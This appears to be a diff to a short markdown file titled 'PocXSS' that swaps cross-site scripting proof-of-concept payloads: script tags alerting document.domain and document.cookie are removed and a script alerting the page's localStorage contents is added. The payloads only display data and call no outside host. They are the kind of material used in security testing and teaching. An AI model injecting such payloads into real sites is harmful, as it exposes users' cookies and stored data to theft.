@@ -1,9 +1,6 @@
 # PocXSS
 ```
-<script type="text/javascript">
-    alert(document.domain);
-</script>
-<script type="text/javascript">
-    alert(document.cookie);
-</script>
+if ('localStorage' in window && window['localStorage'] !== null) {
+    alert(JSON.stringify(window['localStorage']));
+} 
 ```
